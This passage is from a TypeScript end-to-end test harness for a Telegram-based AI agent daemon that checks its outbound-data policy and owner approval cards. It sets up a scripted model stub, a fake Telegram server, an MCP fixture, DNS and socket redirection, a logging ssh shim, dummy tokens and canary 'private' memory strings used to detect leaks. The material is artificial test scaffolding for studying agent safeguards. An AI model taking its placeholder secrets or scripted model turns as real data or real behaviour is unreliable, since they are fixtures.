// End-to-end outbound policy checks. Telegram/model/HTTP/IMAP/MCP stay local.
// Daemon, scripted model and approval buttons follow mcp-tool-policy-daemon.test.ts;
// DNS/socket redirection follows web-fetch-save.test.ts and exec-network.test.ts.
import { spawn, spawnSync, type ChildProcess } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http'
import type { AddressInfo } from 'node:net'
import { tmpdir } from 'node:os'
import { delimiter, dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { createServer as createTlsServer, type Server as TlsServer } from 'node:tls'
import { sandboxProfile } from '../tools-exec/src/index.js'
import { APPROVAL_TTL_MS } from '../telegram/src/approval.js'
import { afterAll, afterEach, beforeAll, beforeEach, expect, test } from 'vitest'

const repoRoot = fileURLToPath(new URL('../..', import.meta.url))

const TEST_TIMEOUT_MS = 280_000
const WAIT_MS = 45_000
const TURN_WAIT_MS = 120_000
const LONG_POLL_HOLD_MS = 20_000

const BOT_TOKEN = '7000001:AAHdshbotTestTokenSecretPart0123456789'
const DEEPSEEK_KEY = 'sk-dshbot-test-secret-key-0123456789abcdef'

const OWNER_CHAT = 7

const MARKER_RE = /turn-[a-z]+-\d+/

const SERVER = 'testsrv'
const ECHO = 'mcp__testsrv__echo'
const WRITE = 'mcp__testsrv__write'
const FALSE_READONLY = 'mcp__testsrv__explicit_write'
const LANG_VALUE = 'en_US.UTF-8'
function findChromium(): string | undefined {
  const configured = process.env.DSHBOT_BROWSER_PATH
  if (configured && existsSync(configured)) return configured
  for (const name of ['chromium', 'chromium-browser', 'google-chrome', 'google-chrome-stable', 'chrome']) {
    for (const directory of (process.env.PATH ?? '').split(delimiter)) {
      const candidate = join(directory, name)
      if (directory !== '' && existsSync(candidate)) return candidate
    }
  }
  return undefined
}
const chromium = findChromium()
const shellQuote = (value: string): string => "'" + value.replaceAll("'", "'\"'\"'") + "'"
const HOST_A = 'first.fixture.test'
const HOST_B = 'second.fixture.test'
const BODY = 'EXTERNAL-FIXTURE-OK'
const PRIVATE_MEMORY = 'memoryAlpha0123456789_private_be'
const PRIVATE_USER = 'userBravo0123456789_private_gamm'
const PRIVATE_IDENTITY = 'identityDelta0123456789_private_'
const PRIVATE_KNOWLEDGE = 'knowledgeFoxtrot0123456789_secre'
const VAULT_VALUE = 'vault-Z9!q' // Shorter than 32: secrets have no fragment-length exemption.

const sleep = (ms: number): Promise<void> => new Promise((resolve) => setTimeout(resolve, ms))

type JsonObject = Record<string, unknown>

// --- the MCP server of the tests -----------------------------------------------------------------------------

/**
 * A stdio MCP server in plain Node. Argument: the data directory of this server. It appends its pid to
 * launches.jsonl at every start and every tools/call to calls.jsonl. One reader and two writers
 * distinguish readOnlyHint: true, missing readOnlyHint and readOnlyHint: false.
 */
const FIXTURE_SERVER = `
import { appendFileSync } from 'node:fs'
import { join } from 'node:path'
import { createInterface } from 'node:readline'

const dir = process.argv[2]
appendFileSync(join(dir, 'launches.jsonl'), JSON.stringify({ pid: process.pid }) + '\\n')

const tools = [
  { name: 'echo', description: 'Read external text.', inputSchema: { type: 'object', properties: { text: { type: 'string' } } }, annotations: { readOnlyHint: true } },
  { name: 'write', description: 'Write external text.', inputSchema: { type: 'object', properties: { text: { type: 'string' } } } },
  { name: 'explicit_write', description: 'Write external text.', inputSchema: { type: 'object', properties: { text: { type: 'string' } } }, annotations: { readOnlyHint: false, destructiveHint: false } },
]

const send = (message) => process.stdout.write(JSON.stringify({ jsonrpc: '2.0', ...message }) + '\\n')

createInterface({ input: process.stdin }).on('line', (line) => {
  let request
  try {
    request = JSON.parse(line)
  } catch {
    return
  }
  const { id, method, params } = request
  if (id === undefined) return
  if (method === 'initialize') {
    send({ id, result: { protocolVersion: params.protocolVersion, capabilities: { tools: {} }, serverInfo: { name: 'testsrv', version: '1.0.0' } } })
  } else if (method === 'ping') {
    send({ id, result: {} })
  } else if (method === 'tools/list') {
    send({ id, result: { tools } })
  } else if (method === 'tools/call') {
    appendFileSync(join(dir, 'calls.jsonl'), JSON.stringify({ name: params.name, arguments: params.arguments || {} }) + '\\n')
    const text = params.name === 'echo' ? 'ECHO:' + ((params.arguments || {}).text || '') : 'DONE:' + params.name
    send({ id, result: { content: [{ type: 'text', text }] } })
  } else {
    send({ id, error: { code: -32601, message: 'method not found: ' + method } })
  }
})
`

// --- timeline of everything the two fake servers saw -------------------------------------------

interface TgEvent {
  n: number
  src: 'tg'
  method: string
  params: JsonObject
  messageId?: number
}

interface DsEvent {
  n: number
  src: 'ds'
  body: JsonObject
}

type Event = TgEvent | DsEvent

interface Timeline {
  events: Event[]
  seq: number
}

async function readBody(req: IncomingMessage): Promise<string> {
  const chunks: Buffer[] = []
  for await (const chunk of req) chunks.push(Buffer.from(chunk as Uint8Array))
  return Buffer.concat(chunks).toString('utf8')
}

function parseObject(raw: string): JsonObject {
  try {
    const parsed: unknown = JSON.parse(raw)
    if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) return parsed as JsonObject
  } catch {
    // multipart or garbage: keep the raw text
  }
  return { __raw: raw }
}

function closeServer(server: Server): Promise<void> {
  return new Promise<void>((resolve) => {
    server.closeAllConnections()
    server.close(() => resolve())
  })
}

function asObject(value: unknown): JsonObject {
  return value && typeof value === 'object' && !Array.isArray(value) ? (value as JsonObject) : {}
}

function deepStrings(value: unknown): string[] {
  if (typeof value === 'string') return [value]
  if (Array.isArray(value)) return value.flatMap(deepStrings)
  if (value && typeof value === 'object') return Object.values(value).flatMap(deepStrings)
  return []
}

// --- request readers ---------------------------------------------------------------------------------

function flatten(content: unknown): string {
  if (typeof content === 'string') return content
  if (!Array.isArray(content)) return ''
  return content
    .map((block: unknown) => {
      if (typeof block === 'string') return block
      const b = asObject(block)
      if (b.type === 'text' && typeof b.text === 'string') return b.text
      return ''
    })
    .join('')
}

interface Block {
  kind: 'text' | 'tool_result'
  text: string
  isError: boolean
}

function blocksOf(content: unknown): Block[] {
  if (typeof content === 'string') return [{ kind: 'text', text: content, isError: false }]
  if (!Array.isArray(content)) return []
  const found: Block[] = []
  for (const raw of content) {
    const block = asObject(raw)
    if (block.type === 'text' && typeof block.text === 'string') {
      found.push({ kind: 'text', text: block.text, isError: false })
    } else if (block.type === 'tool_result') {
      found.push({ kind: 'tool_result', text: flatten(block.content), isError: block.is_error === true })
    }
  }
  return found
}

function messagesOf(body: JsonObject): JsonObject[] {
  return Array.isArray(body.messages) ? body.messages.map(asObject) : []
}

/** Names of the tools a request declares, sorted. */
/** Index of the last user message with a turn marker, and the marker. */
function markerMessage(body: JsonObject): { at: number; marker: string } | undefined {
  const messages = messagesOf(body)
  for (let at = messages.length - 1; at >= 0; at -= 1) {
    const message = messages[at] as JsonObject
    if (message.role !== 'user') continue
    const hit = blocksOf(message.content)
      .filter((block) => block.kind === 'text')
      .map((block) => MARKER_RE.exec(block.text))
      .find((match) => match !== null)
    if (hit !== undefined && hit !== null) return { at, marker: hit[0] }
  }
  return undefined
}

/** Tool results the model got with this request, from its last user message. */
function lastResults(body: JsonObject): Block[] {
  const messages = messagesOf(body)
  const last = messages[messages.length - 1]
  return last !== undefined && last.role === 'user' ? blocksOf(last.content).filter((block) => block.kind === 'tool_result') : []
}

// --- the scripted model --------------------------------------------------------------------------

type Action = { kind: 'tool'; name: string; input: JsonObject } | { kind: 'text'; text: string }

interface Stub {
  server: Server
  origin: string
  /** Tool calls of a turn of main, by marker; after the last one the model answers `fin <marker>`. */
  scripts: Map<string, Action[]>
  dynamic?: (marker: string, step: number, body: JsonObject) => Action | undefined
}

const search = (query: string): Action => ({ kind: 'tool', name: 'tool_search', input: { query } })
const call = (name: string, input: JsonObject = {}): Action => ({ kind: 'tool', name, input })

function sse(event: string, data: unknown): string {
  return `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`
}

function messageStart(): string {
  return sse('message_start', {
    type: 'message_start',
    message: {
      id: 'msg_stub',
      type: 'message',
      role: 'assistant',
      model: 'deepseek-flash',
      content: [],
      stop_reason: null,
      stop_sequence: null,
      usage: { input_tokens: 12, output_tokens: 1 },
    },
  })
}

function messageEnd(stopReason: string): string {
  return [
    sse('message_delta', {
      type: 'message_delta',
      delta: { stop_reason: stopReason, stop_sequence: null },
      usage: { output_tokens: 1 },
    }),
    sse('message_stop', { type: 'message_stop' }),
  ].join('')
}

function textStream(text: string): string {
  return [
    messageStart(),
    sse('content_block_start', { type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }),
    sse('content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } }),
    sse('content_block_stop', { type: 'content_block_stop', index: 0 }),
    messageEnd('end_turn'),
  ].join('')
}

function toolUseStream(id: string, name: string, input: JsonObject): string {
  return [
    messageStart(),
    sse('content_block_start', {
      type: 'content_block_start',
      index: 0,
      content_block: { type: 'tool_use', id, name, input: {} },
    }),
    sse('content_block_delta', {
      type: 'content_block_delta',
      index: 0,
      delta: { type: 'input_json_delta', partial_json: JSON.stringify(input) },
    }),
    sse('content_block_stop', { type: 'content_block_stop', index: 0 }),
    messageEnd('tool_use'),
  ].join('')
}

function plainMessage(text: string): string {
  return JSON.stringify({
    id: 'msg_stub',
    type: 'message',
    role: 'assistant',
    model: 'deepseek-flash',
    content: [{ type: 'text', text }],
    stop_reason: 'end_turn',
    stop_sequence: null,
    usage: { input_tokens: 12, output_tokens: 1 },
  })
}

/** Assistant messages of the turn the last user message with a marker opened. */
function turnStep(body: JsonObject, at: number): number {
  return messagesOf(body)
    .slice(at + 1)
    .filter((message) => message.role === 'assistant').length
}

async function startStub(timeline: Timeline): Promise<Stub> {
  const stub: Stub = { server: undefined as unknown as Server, origin: '', scripts: new Map() }
  let toolUses = 0
  stub.server = createServer((req, res) => {
    void readBody(req).then((raw) => {
      const body = parseObject(raw)
      const isModelCall =
        req.method === 'POST' && (req.url ?? '').split('?')[0]?.endsWith('/messages') && Array.isArray(body.messages)
      if (isModelCall) {
        timeline.seq += 1
        timeline.events.push({ n: timeline.seq, src: 'ds', body })
      }
      if (Array.isArray(body.tools) && body.tools.some((tool) => String(asObject(tool).type).startsWith('web_search'))) {
        res.writeHead(200, { 'content-type': 'application/json' })
        res.end(JSON.stringify({
          id: 'msg_search', type: 'message', role: 'assistant', model: 'deepseek-v4-flash', stop_reason: 'end_turn',
          usage: { input_tokens: 5, output_tokens: 5 },
          content: [{ type: 'web_search_tool_result', tool_use_id: 'srvtoolu_1', content: [
            { type: 'web_search_result', url: 'https://found.example/fact', title: BODY, page_age: '1 day ago' },
          ] }, { type: 'text', text: 'summary', citations: [
            { type: 'web_search_result_location', url: 'https://found.example/fact', cited_text: BODY },
          ] }],
        }))
        return
      }
      if (body.stream !== true) {
        // the judge of /goal asks without streaming: the goal is done after its first turn
        const asked = messagesOf(body).map((m) => flatten(m.content)).join('\n')
        res.writeHead(200, { 'content-type': 'application/json' })
        res.end(plainMessage(/судья/.test(asked) ? '{"done": true, "reason": "ok"}' : 'pong'))
        return
      }
      res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache' })
      const found = markerMessage(body)
      if (found === undefined) {
        res.end(textStream('pong'))
        return
      }
      const script = stub.scripts.get(found.marker) ?? []
      const step = turnStep(body, found.at)
      const action = stub.dynamic?.(found.marker, step, body) ?? script[step]
      if (action === undefined || action.kind === 'text') {
        res.end(textStream(action?.text ?? `fin ${found.marker}`))
      } else {
        toolUses += 1
        res.end(toolUseStream(`toolu_main_${toolUses}`, action.name, action.input))
      }
    })
  })
  await new Promise<void>((resolve) => stub.server.listen(0, '127.0.0.1', resolve))
  stub.origin = `http://127.0.0.1:${(stub.server.address() as AddressInfo).port}`
  return stub
}

// --- fake Telegram Bot API over local HTTP ----------------------------------------------------

interface QueuedUpdate {
  update: JsonObject
  delivered: boolean
}

interface Holder {
  res: ServerResponse
  timer: NodeJS.Timeout
}

interface FakeTelegram {
  server: Server
  origin: string
  queue: QueuedUpdate[]
  holders: Holder[]
  polls: number
  sentIds: number
  push(update: JsonObject): void
}

function flushQueue(tg: FakeTelegram): void {
  const ready = tg.queue.filter((q) => !q.delivered)
  const holder = ready.length > 0 ? tg.holders.shift() : undefined
  if (!holder) return
  clearTimeout(holder.timer)
  for (const q of ready) q.delivered = true
  holder.res.writeHead(200, { 'content-type': 'application/json' })
  holder.res.end(JSON.stringify({ ok: true, result: ready.map((q) => q.update) }))
}

function okResult(tg: FakeTelegram, method: string, params: JsonObject): unknown {
  if (method === 'getMe') return { id: 4242, is_bot: true, first_name: 'DSHBOT', username: 'dshbot_test_bot' }
  if (method === 'sendMessage' || method === 'sendRichMessage') {
    tg.sentIds += 1
    const chatId = typeof params.chat_id === 'number' ? params.chat_id : OWNER_CHAT
    return { message_id: 9000 + tg.sentIds, date: Math.floor(Date.now() / 1000), chat: { id: chatId, type: 'private' }, text: '' }
  }
  return true
}

async function startTelegram(timeline: Timeline): Promise<FakeTelegram> {
  const tg: FakeTelegram = {
    server: undefined as unknown as Server,
    origin: '',
    queue: [],
    holders: [],
    polls: 0,
    sentIds: 0,
    push(update) {
      tg.queue.push({ update, delivered: false })
      flushQueue(tg)
    },
  }
  tg.server = createServer((req, res) => {
    void readBody(req).then((raw) => {
      const match = /^\/bot(.+)\/([A-Za-z]+)$/.exec((req.url ?? '').split('?')[0] ?? '')
      const method = match?.[2] ?? ''
      const params = parseObject(raw)
      timeline.seq += 1
      const event: TgEvent = { n: timeline.seq, src: 'tg', method, params }
      timeline.events.push(event)

      const reply = (status: number, body: string): void => {
        res.writeHead(status, { 'content-type': 'application/json' })
        res.end(body)
      }
      if (!match || decodeURIComponent(match[1] ?? '') !== BOT_TOKEN) {
        reply(401, JSON.stringify({ ok: false, error_code: 401, description: 'Unauthorized' }))
        return
      }
      if (method === 'getUpdates') {
        tg.polls += 1
        const offset = typeof params.offset === 'number' ? params.offset : undefined
        tg.queue = tg.queue.filter((q) => !(q.delivered && offset !== undefined && (q.update.update_id as number) < offset))
        if (tg.queue.length > 0) {
          for (const q of tg.queue) q.delivered = true
          reply(200, JSON.stringify({ ok: true, result: tg.queue.map((q) => q.update) }))
          return
        }
        const holder: Holder = {
          res,
          timer: setTimeout(() => {
            const at = tg.holders.indexOf(holder)
            if (at >= 0) tg.holders.splice(at, 1)
            reply(200, JSON.stringify({ ok: true, result: [] }))
          }, LONG_POLL_HOLD_MS),
        }
        tg.holders.push(holder)
        res.on('close', () => {
          clearTimeout(holder.timer)
          const at = tg.holders.indexOf(holder)
          if (at >= 0) tg.holders.splice(at, 1)
        })
        return
      }
      const result = okResult(tg, method, params)
      const sentId = asObject(result).message_id
      if (typeof sentId === 'number') event.messageId = sentId
      reply(200, JSON.stringify({ ok: true, result }))
    })
  })
  await new Promise<void>((resolve) => tg.server.listen(0, '127.0.0.1', resolve))
  tg.origin = `http://127.0.0.1:${(tg.server.address() as AddressInfo).port}`
  return tg
}

// --- update builders and readers ---------------------------------------------------------------

let nextMessageId = 100
let updateCounter = 5000

function privateMessage(chatId: number, text: string): JsonObject {
  updateCounter += 1
  nextMessageId += 1
  return {
    update_id: updateCounter,
    message: {
      message_id: nextMessageId,
      date: Math.floor(Date.now() / 1000),
      chat: { id: chatId, type: 'private', first_name: 'T' },
      from: { id: chatId, is_bot: false, first_name: 'T' },
      text,
    },
  }
}

function buttonPress(fromId: number, messageId: number, data: string): JsonObject {
  updateCounter += 1
  return {
    update_id: updateCounter,
    callback_query: {
      id: `cb-${updateCounter}`,
      from: { id: fromId, is_bot: false, first_name: 'T' },
      chat_instance: 'dshbot-test-instance',
      data,
      message: {
        message_id: messageId,
        date: Math.floor(Date.now() / 1000),
        chat: { id: OWNER_CHAT, type: 'private', first_name: 'T' },
        text: 'card',
      },
    },
  }
}

function sentTo(timeline: Timeline, chatId: number): TgEvent[] {
  return timeline.events.filter(
    (e): e is TgEvent =>
      e.src === 'tg' &&
      (e.method === 'sendMessage' || e.method === 'sendRichMessage') &&
      e.params.chat_id === chatId,
  )
}

/** An approval card: a sent message with an inline keyboard of an allow and a deny button. */
interface Card {
  chatId: number
  messageId: number
  text: string
  allow: string
  deny: string
}

function cardsIn(timeline: Timeline, chatId: number): Card[] {
  const cards: Card[] = []
  for (const e of sentTo(timeline, chatId)) {
    const rows = asObject(e.params.reply_markup).inline_keyboard
    if (!Array.isArray(rows) || e.messageId === undefined) continue
    const data = rows
      .flatMap((row) => (Array.isArray(row) ? row.map(asObject) : []))
      .map((button) => (typeof button.callback_data === 'string' ? button.callback_data : ''))
    // callback_data of an approval is tga1[r]:<kind>:<a|d>:<id>
    const allow = data.find((d) => /^tga1r?:/.test(d) && d.split(':')[2] === 'a')
    const deny = data.find((d) => /^tga1r?:/.test(d) && d.split(':')[2] === 'd')
    if (allow === undefined || deny === undefined) continue
    cards.push({ chatId, messageId: e.messageId, text: deepStrings(e.params.text).join('\n'), allow, deny })
  }
  return cards
}

// --- the daemon as a child process ------------------------------------------------------------------

interface Daemon {
  child: ChildProcess
  stdout: string
  stderr: string
  exit: Promise<{ code: number | null; signal: NodeJS.Signals | null }>
  exited: boolean
}

interface World {
  timeline: Timeline
  tg: FakeTelegram
  stub: Stub
  home: string
  dshbotHome: string
  /** Where the MCP server of the tests writes down launches and calls. */
  dataDir: string
  daemons: Daemon[]
  fixture: Server
  fixturePort: number
  hits: string[]
  binDir: string
  sshLog: string
  imap: TlsServer
}

let scratch: string
let serverFile: string
let world: World
let preloadFile: string
let searchShim: string
let certFile: string
let browserPath: string

function startScript(): string {
  const manifest = JSON.parse(readFileSync(join(repoRoot, 'package.json'), 'utf8')) as { scripts?: Record<string, unknown> }
  const script = manifest.scripts?.start
  expect(typeof script, 'package.json must define scripts.start (entry point of the daemon)').toBe('string')
  return script as string
}

function spawnDaemon(extraEnv: Record<string, string>): Daemon {
  const env: Record<string, string> = {
    HOME: world.home,
    USERPROFILE: world.home,
    LANG: LANG_VALUE,
    PATH: [world.binDir, dirname(process.execPath), join(repoRoot, 'node_modules', '.bin'), process.env.PATH ?? ''].join(delimiter),
    TELEGRAM_BOT_TOKEN: BOT_TOKEN,
    DEEPSEEK_API_KEY: DEEPSEEK_KEY,
    DSHBOT_HOME: world.dshbotHome,
    DEEPSEEK_BASE_URL: `${world.stub.origin}/anthropic`,
    TELEGRAM_API_ROOT: world.tg.origin,
    DSHBOT_DREAM_AT: 'off',
    DSHBOT_BROWSER_PATH: browserPath,
    MAIL_TEST_PASSWORD: 'fixture-password',
    NODE_EXTRA_CA_CERTS: certFile,
    NODE_OPTIONS: `--import ${pathToFileURL(preloadFile).href}`,
    OUTBOUND_CLOCK_FILE: join(world.dataDir, 'clock-offset'),
    OUTBOUND_SEARCH_SHIM: pathToFileURL(searchShim).href,
    OUTBOUND_SEARCH_URL: `${world.stub.origin}/anthropic`,
    ...extraEnv,
  }
  const child = spawn('sh', ['-c', `exec ${startScript()}`], { cwd: repoRoot, env, stdio: ['ignore', 'pipe', 'pipe'] })
  const daemon: Daemon = {
    child,
    stdout: '',
    stderr: '',
    exited: false,
    exit: new Promise((resolve) => {
      child.on('close', (code, signal) => {
        daemon.exited = true
        resolve({ code, signal })
      })
    }),
  }
  child.stdout?.on('data', (chunk: Buffer) => {
    daemon.stdout += chunk.toString('utf8')
  })
  child.stderr?.on('data', (chunk: Buffer) => {
    daemon.stderr += chunk.toString('utf8')
  })
  world.daemons.push(daemon)
  return daemon
}

function output(d: Daemon): string {
  return `--- stdout ---\n${d.stdout.slice(-3000)}\n--- stderr ---\n${d.stderr.slice(-3000)}`
}

async function waitFor(what: string, cond: () => boolean, d?: Daemon, timeoutMs = WAIT_MS): Promise<void> {
  const started = Date.now()
  while (!cond() && Date.now() - started < timeoutMs) await sleep(40)
  expect(cond(), `timed out waiting for: ${what}\n${d ? output(d) : ''}`).toBe(true)
}

async function startDaemon(extraEnv: Record<string, string> = {}): Promise<Daemon> {
  const before = world.tg.polls
  const d = spawnDaemon(extraEnv)
  await waitFor('the daemon to start long polling', () => world.tg.polls > before || d.exited, d)
  expect(d.exited, `daemon exited during start\n${output(d)}`).toBe(false)
  await sleep(300)
  return d
}

/** SIGTERM and wait for the exit: the next daemon starts on the same state directory. */
function say(chatId: number, text: string): void {
  world.tg.push(privateMessage(chatId, text))
}

function pairingCandidates(fresh: string): string[] {
  const found: Array<{ token: string; rank: number; hinted: number; at: number }> = []
  let at = 0
  for (const line of fresh.split('\n')) {
    const hinted = /code|код|pair/i.test(line) ? 0 : 1
    for (const token of line.match(/[A-Za-z0-9]+(?:-[A-Za-z0-9]+)*/g) ?? []) {
      at += 1
      if (token.length < 6) continue
      if (/^\d{4}-\d{2}-\d{2}/.test(token) || /^1[67]\d{11}$/.test(token)) continue
      if ([BOT_TOKEN, DEEPSEEK_KEY, BOT_TOKEN.split(':')[1] ?? ''].some((s) => s.includes(token))) continue
      found.push({ token, rank: /\d/.test(token) ? 0 : /^[a-z]+$/.test(token) ? 2 : 1, hinted, at })
    }
  }
  found.sort((a, b) => a.rank - b.rank || a.hinted - b.hinted || a.at - b.at)
  return [...new Set(found.map((f) => f.token))]
}

/** The first private chat pairs as the owner with the one-time code from the journal. */
async function pairOwner(d: Daemon): Promise<void> {
  const mark = d.stderr.length
  say(OWNER_CHAT, 'hello')
  await waitFor(
    'a pairing code in the daemon journal (stderr)',
    () => pairingCandidates(d.stderr.slice(mark)).length > 0 && sentTo(world.timeline, OWNER_CHAT).length > 0,
    d,
  )
  const sentBefore = sentTo(world.timeline, OWNER_CHAT).length
  say(OWNER_CHAT, pairingCandidates(d.stderr.slice(mark))[0] as string)
  await waitFor('the pairing confirmation', () => sentTo(world.timeline, OWNER_CHAT).length > sentBefore, d)
}

async function startOwnerDaemon(extraEnv: Record<string, string> = {}): Promise<Daemon> {
  const d = await startDaemon(extraEnv)
  await pairOwner(d)
  return d
}

/** Model requests of the main model for one turn, in order. */
function turnCalls(marker: string): DsEvent[] {
  return world.timeline.events.filter(
    (e): e is DsEvent => e.src === 'ds' && e.body.stream !== false && markerMessage(e.body)?.marker === marker,
  )
}

function replyEvent(chatId: number, marker: string): TgEvent | undefined {
  const reply = new RegExp(`fin ${marker}(?!\\d)`)
  return sentTo(world.timeline, chatId).find((e) => reply.test(JSON.stringify(e.params)))
}

/** `chatId` opens a turn with `marker` and waits for the reply of the model to arrive in the chat. */
async function turnAs(d: Daemon, chatId: number, marker: string): Promise<DsEvent[]> {
  say(chatId, `${marker} сделай, пожалуйста`)
  await waitFor(`the reply of turn ${marker}`, () => replyEvent(chatId, marker) !== undefined, d, TURN_WAIT_MS)
  const calls = turnCalls(marker)
  expect(calls.length, `the model was not asked in turn ${marker}\n${output(d)}`).toBeGreaterThan(0)
  return calls
}

const ownerTurn = (d: Daemon, marker: string): Promise<DsEvent[]> => turnAs(d, OWNER_CHAT, marker)

// --- helpers of the commands -----------------------------------------------------------------------------

/** Texts the chat got after `mark`, without the markup. */
function textsSince(chatId: number, mark: number): string[] {
  return sentTo(world.timeline, chatId)
    .filter((e) => e.n > mark)
    .map((e) =>
      deepStrings(e.params)
        .join('\n')
        .replace(/<\/?(?:b|i|u|s|code|pre|strong|em)>/g, '')
        .replace(/\\/g, ''),
    )
}

/** A command of the owner: waits until what the chat got back satisfies `until` and returns it joined. */
async function commandUntil(d: Daemon, text: string, until: (reply: string) => boolean): Promise<string> {
  const mark = world.timeline.seq
  say(OWNER_CHAT, text)
  await waitFor(
    `an answer to ${JSON.stringify(text)} that fits`,
    () => {
      const reply = textsSince(OWNER_CHAT, mark).join('\n')
      return reply.trim() !== '' && until(reply)
    },
    d,
  )
  await sleep(300)
  return textsSince(OWNER_CHAT, mark).join('\n')
}

// --- the MCP files of the tests --------------------------------------------------------------------------

const mcpJsonPath = (): string => join(world.dshbotHome, 'mcp.json')

function writeMcpJson(servers: Record<string, unknown>): void {
  writeFileSync(mcpJsonPath(), `${JSON.stringify({ mcpServers: servers }, null, 2)}\n`)
}

/** Data directory of one stdio server of the tests: its launches and calls. */
function dirOf(name: string): string {
  const dir = join(world.dataDir, name)
  mkdirSync(dir, { recursive: true })
  return dir
}

/** The stdio server `name` with the policy fields of `extra`. */
function stdioEntry(name: string, extra: Record<string, unknown> = {}): Record<string, unknown> {
  return { command: process.execPath, args: [serverFile, dirOf(name)], ...extra }
}

function jsonLines(file: string): JsonObject[] {
  if (!existsSync(file)) return []
  return readFileSync(file, 'utf8')
    .split('\n')
    .filter((line) => line !== '')
    .map((line) => parseObject(line))
}

const launches = (name: string): JsonObject[] => jsonLines(join(world.dataDir, name, 'launches.jsonl'))
const callsOf = (name: string): JsonObject[] => jsonLines(join(world.dataDir, name, 'calls.jsonl'))
const calledNames = (name: string): unknown[] => callsOf(name).map((c) => c.name)

/** The daemon connects the servers of mcp.json at start: wait for their launches, then for the tool lists. */
async function waitServersUp(d: Daemon, names: string[]): Promise<void> {
  for (const name of names) await waitFor(`the MCP server ${name} to be launched`, () => launches(name).length > 0, d)
  await sleep(1_500)
}

// --- harness lifecycle ----------------------------------------------------------------------------------

// Only transports are redirected. Real tool implementations, runner hooks and approval callbacks run.
const TRANSPORT_PRELOAD = String.raw`
import { createRequire, syncBuiltinESMExports, registerHooks } from 'node:module'
import { readFileSync } from 'node:fs'
const RealDate = Date
const realNow = RealDate.now.bind(RealDate)
function offset() {
  try { return Number(readFileSync(process.env.OUTBOUND_CLOCK_FILE, 'utf8')) || 0 } catch { return 0 }
}
globalThis.Date = new Proxy(RealDate, {
  construct(target, args, newTarget) {
    return args.length === 0 ? new target(realNow() + offset()) : Reflect.construct(target, args, newTarget)
  },
  get(target, property) {
    return property === 'now' ? () => realNow() + offset() : Reflect.get(target, property)
  },
  apply(target) { return new target(realNow() + offset()).toString() },
})
const require = createRequire(import.meta.url)
const net = require('node:net')
const dns = require('node:dns')
const originalLookup = dns.promises.lookup
const originalConnect = net.Socket.prototype.connect
const names = ['first.fixture.test', 'second.fixture.test']
dns.promises.lookup = async function(host, options) {
  if (!names.includes(host)) return originalLookup.call(this, host, options)
  const entry = { address: '93.184.216.34', family: 4 }
  return options?.all ? [entry] : entry
}
net.Socket.prototype.connect = function(...args) {
  const options = Array.isArray(args[0]) ? args[0][0] : args[0]
  if (options && typeof options === 'object' && (names.includes(options.host) || options.host === '93.184.216.34')) {
    options.host = '127.0.0.1'
    delete options.lookup
  }
  return originalConnect.apply(this, args)
}
syncBuiltinESMExports()
registerHooks({
  resolve(specifier, context, nextResolve) {
    if (context.parentURL?.includes('/packages/app/src/') && /tools-web\/src\/index\.js$/.test(specifier)) {
      return { url: process.env.OUTBOUND_SEARCH_SHIM, shortCircuit: true }
    }
    return nextResolve(specifier, context)
  },
})
`

beforeAll(() => {
  scratch = realpathSync(mkdtempSync(join(tmpdir(), 'dshbot-outbound-')))
  serverFile = join(scratch, 'server.mjs')
  writeFileSync(serverFile, FIXTURE_SERVER)
  preloadFile = join(scratch, 'transports.mjs')
  writeFileSync(preloadFile, TRANSPORT_PRELOAD)
  searchShim = join(scratch, 'search-endpoint.mjs')
  const realWeb = pathToFileURL(join(repoRoot, 'packages/tools-web/src/index.ts')).href
  writeFileSync(searchShim, `
import * as real from ${JSON.stringify(realWeb)}
export * from ${JSON.stringify(realWeb)}
export function createWebTools(options) {
  return real.createWebTools({ ...options, searchBaseUrl: process.env.OUTBOUND_SEARCH_URL })
}
`)
  certFile = join(scratch, 'mail-cert.pem')
  writeFileSync(certFile, TLS_CERT)
  browserPath = join(scratch, 'chromium')
  writeFileSync(browserPath, `#!/bin/sh\nexec ${shellQuote(chromium ?? '/nonexistent/chromium')} --no-sandbox "$@"\n`, { mode: 0o755 })
})

afterAll(() => {
  rmSync(scratch, { recursive: true, force: true })
})

beforeEach(async () => {
  const timeline: Timeline = { events: [], seq: 0 }
  const stub = await startStub(timeline)
  const tg = await startTelegram(timeline)
  const dshbotHome = join(mkdtempSync(join(scratch, 'state-')), 'dshbot')
  const dataDir = mkdtempSync(join(scratch, 'data-'))
  writeFileSync(join(dataDir, 'clock-offset'), '0')
  const hits: string[] = []
  const fixture = createServer((request, response) => {
    hits.push(`${request.headers.host}${request.url}`)
    response.writeHead(200, { 'content-type': 'text/html' })
    response.end(`<html><body>${BODY}<input aria-label="note"></body></html>`)
  })
  await new Promise<void>((resolve) => fixture.listen(0, '127.0.0.1', resolve))
  const binDir = mkdtempSync(join(scratch, 'bin-'))
  const sshLog = join(dataDir, 'ssh.log')
  writeFileSync(join(binDir, 'ssh'), `#!/bin/sh\nprintf '%s\n' "$*" >> '${sshLog}'\necho HOST-EXEC-OK\n`, { mode: 0o755 })
  const imap = await startImapFixture()
  world = { timeline, tg, stub, home: mkdtempSync(join(scratch, 'home-')), dshbotHome, dataDir, daemons: [],
    fixture, fixturePort: (fixture.address() as AddressInfo).port, hits, binDir, sshLog, imap }
  mkdirSync(join(dshbotHome, 'workspace'), { recursive: true })
  writeFileSync(join(dshbotHome, 'workspace', 'local.txt'), 'LOCAL-FIXTURE-OK\n')
  mkdirSync(join(dshbotHome, 'memory', 'knowledge'), { recursive: true })
  writeFileSync(join(dshbotHome, 'memory', 'MEMORY.md'), `# Memory\nleft:${PRIVATE_MEMORY}:right\n`)
  writeFileSync(join(dshbotHome, 'memory', 'USER.md'), `# User\nleft:${PRIVATE_USER}:right\n`)
  writeFileSync(join(dshbotHome, 'memory', 'identity.md'), `# Identity\n${PRIVATE_IDENTITY}\n${'I keep private facts. '.repeat(20)}`)
  writeFileSync(join(dshbotHome, 'memory', 'knowledge', 'private-topic.md'), `---\nsummary: Private topic\nupdated: 2026-10-25\n---\nleft:${PRIVATE_KNOWLEDGE}:right\n`)
